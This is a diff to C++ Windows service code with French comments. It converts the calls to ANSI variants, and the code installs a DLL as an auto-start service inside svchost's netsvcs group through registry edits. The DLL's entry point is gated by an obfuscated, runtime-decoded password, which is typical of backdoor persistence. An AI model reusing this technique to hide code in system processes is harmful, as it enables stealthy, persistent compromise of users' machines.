@@ -13,9 +13,9 @@
 
 void startService();
 
-extern TCHAR* GLOBAL_SERVICE_DESCRIPTION;
-extern TCHAR* GLOBAL_SERVICE_NAME;
-extern TCHAR* GLOBAL_SERVICE_KEY;
+extern char* GLOBAL_SERVICE_DESCRIPTION;
+extern char* GLOBAL_SERVICE_NAME;
+extern char* GLOBAL_SERVICE_KEY;
 
 static SERVICE_STATUS_HANDLE   hServiceStatusHandle; 
 static SERVICE_STATUS          ServiceStatus; 
@@ -23,13 +23,16 @@ static SERVICE_STATUS          ServiceStatus;
 static char buff[MAX_PATH]; 
 
 void WINAPI ExecuteService(HWND, HINSTANCE, LPSTR lpszCmdLine, int){
-	const char *pass =  SnE("daFdSA==", "'test'");
+	const wchar_t *pass =  SnE("Z6tB", "'foo'");
+	std::wstring wide = tosW(lpszCmdLine);
 
-	int test = strcmp(lpszCmdLine, pass);
+	int test = wcscmp(wide.c_str(), pass);
 	if (test != 0){
-		MYPRINTF("Bad password\n");
+		MYPRINTF("Bad password %w != %w\n", lpszCmdLine, pass);
+		delete[] pass;
 		return;
 	}
+	delete[] pass;
 	startService();
 }
 
@@ -46,41 +49,41 @@ int WINAPI InstallAnotherService(const char *serviceName, const char *dllpath, c
 	if(schScm)
 	{
 		// Créer notre service:
-		schService = CreateService(schScm, serviceName, 0, SERVICE_ALL_ACCESS, SERVICE_WIN32_SHARE_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, "%SystemRoot%\\System32\\svchost.exe -k netsvcs", 0, 0, 0, 0, 0); 
+		schService = CreateServiceA(schScm, serviceName, 0, SERVICE_ALL_ACCESS, SERVICE_WIN32_SHARE_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, "%SystemRoot%\\System32\\svchost.exe -k netsvcs", 0, 0, 0, 0, 0); 
 		if(schService)
 		{
 			// Ajouter une description à notre service:
-			SERVICE_DESCRIPTION sd;
+			SERVICE_DESCRIPTIONA sd;
 			sd.lpDescription = description;
 			ChangeServiceConfig2(schService, SERVICE_CONFIG_DESCRIPTION, &sd);
 			// Ajouter la sous-clé Parameters à la clé de notre service:
 			sprintf_s(buffer, 512, "SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", serviceName);
-			RegCreateKeyEx(HKEY_LOCAL_MACHINE, buffer, 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &hkService, 0);   
+			RegCreateKeyExA(HKEY_LOCAL_MACHINE, buffer, 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &hkService, 0);   
 			// Affecter le chemin de la Dll à la sous-clé Parameters sous le nom ServiceDll:
-			RegSetValueEx(hkService, "ServiceDll", 0, REG_EXPAND_SZ, (BYTE*)dllpath, lstrlen(dllpath)+1);
+			RegSetValueExA(hkService, "ServiceDll", 0, REG_EXPAND_SZ, (BYTE*)dllpath, strlen(dllpath)+1);
 			// Fermer la clé de notre service:
 			RegCloseKey(hkService);
 			// Ouvrir la clé indiquant la liste des groupes d'instances de svchost.exe:
-			RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost", 0, KEY_ALL_ACCESS, &hkSvchost); 
+			RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost", 0, KEY_ALL_ACCESS, &hkSvchost); 
 			// Obtenir la longueur du contenu du groupe netsvcs:
-			RegQueryValueEx(hkSvchost, "netsvcs", 0, 0, 0, &dwSize); 
+			RegQueryValueExA(hkSvchost, "netsvcs", 0, 0, 0, &dwSize); 
 			// Fixer le nom de notre service pour la liste des services du groupe netsvcs:
-			lstrcpy(buff, serviceName);
-			dwLen=lstrlen(buff);
+			strcpy_s(buff, serviceName);
+			dwLen = strlen(buff);
 			// Allouer la mémoire nécessaire pour la nouvelle liste des noms de services du groupe netsvcs:
 			pData = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize + dwLen + 1);
 			if(pData)
 			{
 				char *pNames;
 				// Récupérer la liste des noms de services du groupe netsvcs:
-				RegQueryValueEx(hkSvchost, "netsvcs", 0, 0, (BYTE*)pData, &dwSize);
+				RegQueryValueExA(hkSvchost, "netsvcs", 0, 0, (BYTE*)pData, &dwSize);
 				// Vérifier si le nom existe
-				for (pNames = pData; *pNames; pNames=strchr(pNames, 0) + 1) if(!lstrcmpi(pNames, buff)) break;   
+				for (pNames = pData; *pNames; pNames=strchr(pNames, 0) + 1) if(!_strcmpi(pNames, buff)) break;   
 				// L'ajouter s'il n'existe pas:
 				if (*pNames == 0)
 				{
 					memcpy(pData + dwSize - 1, buff, dwLen + 1);
-					RegSetValueEx(hkSvchost, "netsvcs", 0, REG_MULTI_SZ, (BYTE*)pData, dwSize + dwLen + 1);
+					RegSetValueExA(hkSvchost, "netsvcs", 0, REG_MULTI_SZ, (BYTE*)pData, dwSize + dwLen + 1);
 				}
 				else dwError = ERROR_ALREADY_EXISTS;
 				// Libérer la mémoire allouée:
@@ -117,42 +120,42 @@ int WINAPI InstallService(HWND, HINSTANCE, LPSTR, int)
 	if(schScm)
 	{
 		// Créer notre service:
-		schService = CreateService(schScm, GLOBAL_SERVICE_NAME, 0, SERVICE_ALL_ACCESS, SERVICE_WIN32_SHARE_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, "%SystemRoot%\\System32\\svchost.exe -k netsvcs", 0, 0, 0, 0, 0); 
+		schService = CreateServiceA(schScm, GLOBAL_SERVICE_NAME, 0, SERVICE_ALL_ACCESS, SERVICE_WIN32_SHARE_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, "%SystemRoot%\\System32\\svchost.exe -k netsvcs", 0, 0, 0, 0, 0); 
 		if(schService)
 		{
 			// Ajouter une description à notre service:
-			SERVICE_DESCRIPTION sd;
+			SERVICE_DESCRIPTIONA sd;
 			sd.lpDescription = GLOBAL_SERVICE_DESCRIPTION;
-			ChangeServiceConfig2(schService, SERVICE_CONFIG_DESCRIPTION, &sd);
+			ChangeServiceConfig2A(schService, SERVICE_CONFIG_DESCRIPTION, &sd);
 			// Ajouter la sous-clé Parameters à la clé de notre service:
-			RegCreateKeyEx(HKEY_LOCAL_MACHINE, GLOBAL_SERVICE_KEY, 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &hkService, 0);   
+			RegCreateKeyExA(HKEY_LOCAL_MACHINE, GLOBAL_SERVICE_KEY, 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &hkService, 0);   
 			// Récupérer le chemin complet de notre Dll:
-			GetModuleFileName(hDll, buff, sizeof(buff));
+			GetModuleFileNameA(hDll, buff, sizeof(buff));
 			// Affecter le chemin de la Dll à la sous-clé Parameters sous le nom ServiceDll:
-			RegSetValueEx(hkService, "ServiceDll", 0, REG_EXPAND_SZ, (BYTE*)buff, lstrlen(buff) + 1);
+			RegSetValueExA(hkService, "ServiceDll", 0, REG_EXPAND_SZ, (BYTE*)buff, strlen(buff) + 1);
 			// Fermer la clé de notre service:
 			RegCloseKey(hkService);
 			// Ouvrir la clé indiquant la liste des groupes d'instances de svchost.exe:
-			RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost", 0, KEY_ALL_ACCESS, &hkSvchost); 
+			RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost", 0, KEY_ALL_ACCESS, &hkSvchost); 
 			// Obtenir la longueur du contenu du groupe netsvcs:
-			RegQueryValueEx(hkSvchost, "netsvcs", 0, 0, 0, &dwSize); 
+			RegQueryValueExA(hkSvchost, "netsvcs", 0, 0, 0, &dwSize); 
 			// Fixer le nom de notre service pour la liste des services du groupe netsvcs:
-			lstrcpy(buff, GLOBAL_SERVICE_NAME);
-			dwLen=lstrlen(buff);
+			strcpy_s(buff, GLOBAL_SERVICE_NAME);
+			dwLen=strlen(buff);
 			// Allouer la mémoire nécessaire pour la nouvelle liste des noms de services du groupe netsvcs:
 			pData = (char *)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,dwSize + dwLen + 1);
 			if(pData)
 			{
 				char *pNames;
 				// Récupérer la liste des noms de services du groupe netsvcs:
-				RegQueryValueEx(hkSvchost, "netsvcs", 0, 0, (BYTE*)pData, &dwSize);
+				RegQueryValueExA(hkSvchost, "netsvcs", 0, 0, (BYTE*)pData, &dwSize);
 				// Vérifier si le nom existe
-				for (pNames = pData; *pNames; pNames = strchr(pNames, 0) + 1) if(!lstrcmpi(pNames, buff)) break;   
+				for (pNames = pData; *pNames; pNames = strchr(pNames, 0) + 1) if(!_strcmpi(pNames, buff)) break;   
 				// L'ajouter s'il n'existe pas:
 				if (*pNames == 0)
 				{
 					memcpy(pData + dwSize - 1, buff, dwLen + 1);
-					RegSetValueEx(hkSvchost, "netsvcs", 0, REG_MULTI_SZ, (BYTE*)pData, dwSize + dwLen + 1);
+					RegSetValueExA(hkSvchost, "netsvcs", 0, REG_MULTI_SZ, (BYTE*)pData, dwSize + dwLen + 1);
 				}
 				else dwError=ERROR_ALREADY_EXISTS;
 				// Libérer la mémoire allouée:
@@ -179,7 +182,6 @@ int WINAPI InstallService(HWND, HINSTANCE, LPSTR, int)
 	return dwError ? dwError : GetLastError();
 }
 
-// Fonction de désinstallation du service:
 DWORD WINAPI RemoveService(HWND, HINSTANCE, LPSTR, int)
 {
 	HKEY hkSvchost;
@@ -193,34 +195,34 @@ DWORD WINAPI RemoveService(HWND, HINSTANCE, LPSTR, int)
 	if(schScm)
 	{
 		// Ouvrir notre service:
-		schService=OpenService(schScm, GLOBAL_SERVICE_NAME, SERVICE_ALL_ACCESS);
+		schService=OpenServiceA(schScm, GLOBAL_SERVICE_NAME, SERVICE_ALL_ACCESS);
 		if(schService)
 		{
 			// Supprimer le service:
 			if(DeleteService(schService))
 			{
 				// Ouvrir la clé indiquant la liste des groupes d'instances de svchost.exe:
-				RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost", 0, KEY_ALL_ACCESS, &hkSvchost); 
+				RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost", 0, KEY_ALL_ACCESS, &hkSvchost); 
 				// Obtenir la longueur du contenu du groupe netsvcs:
-				RegQueryValueEx(hkSvchost, "netsvcs", 0, 0, 0, &dwSize); 
+				RegQueryValueExA(hkSvchost, "netsvcs", 0, 0, 0, &dwSize); 
 				// Fixer le nom de notre service pour la liste des services du groupe netsvcs:
-				lstrcpy(buff, GLOBAL_SERVICE_NAME);
+				strcpy_s(buff, GLOBAL_SERVICE_NAME);
 				// Allouer la mémoire nécessaire pour tous les noms de services du groupe netsvcs:
 				pData = (char *)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,dwSize);
 				if(pData)
 				{
 					char *pNames;
 					// Récupérer la liste des noms de services du groupe netsvcs:
-					RegQueryValueEx(hkSvchost, "netsvcs", 0, 0, (BYTE*)pData, &dwSize);
+					RegQueryValueExA(hkSvchost, "netsvcs", 0, 0, (BYTE*)pData, &dwSize);
 					// Vérifier si le nom existe:
-					for (pNames = pData; *pNames; pNames=strchr(pNames,0)+1) if(!lstrcmpi(pNames,buff)) break;   
+					for (pNames = pData; *pNames; pNames=strchr(pNames,0)+1) if(!_strcmpi(pNames,buff)) break;   
 					// Le supprimer s'il existe:
 					if (*pNames)
 					{
 						char* pNext;
 						pNext=strchr(pNames,0)+1;
 						memcpy(pNames,pNext,dwSize-(pNext-pData));
-						RegSetValueEx(hkSvchost, "netsvcs", 0, REG_MULTI_SZ, (BYTE*)pData, dwSize -(lstrlen(buff)+1));
+						RegSetValueExA(hkSvchost, "netsvcs", 0, REG_MULTI_SZ, (BYTE*)pData, dwSize -(strlen(buff) + 1));
 					}
 					else dwError=ERROR_NO_SUCH_MEMBER;
 					// Libérer la mémoire allouée:
@@ -289,7 +291,7 @@ DWORD WINAPI KillService(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmd
 VOID WINAPI ServiceMain(DWORD, LPTSTR *)
 {
 
-	hServiceStatusHandle = RegisterServiceCtrlHandlerEx(GLOBAL_SERVICE_NAME, HandlerEx, NULL); 
+	hServiceStatusHandle = RegisterServiceCtrlHandlerExA(GLOBAL_SERVICE_NAME, HandlerEx, NULL); 
 
 
 	if (hServiceStatusHandle)
@@ -310,6 +312,7 @@ VOID WINAPI ServiceMain(DWORD, LPTSTR *)
 		ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN ;
 		SetServiceStatus(hServiceStatusHandle, &ServiceStatus);
 
+		Global::get().startRunning();
 		startService();
 
 		// Mettre le service dans l'état "Arrêté":
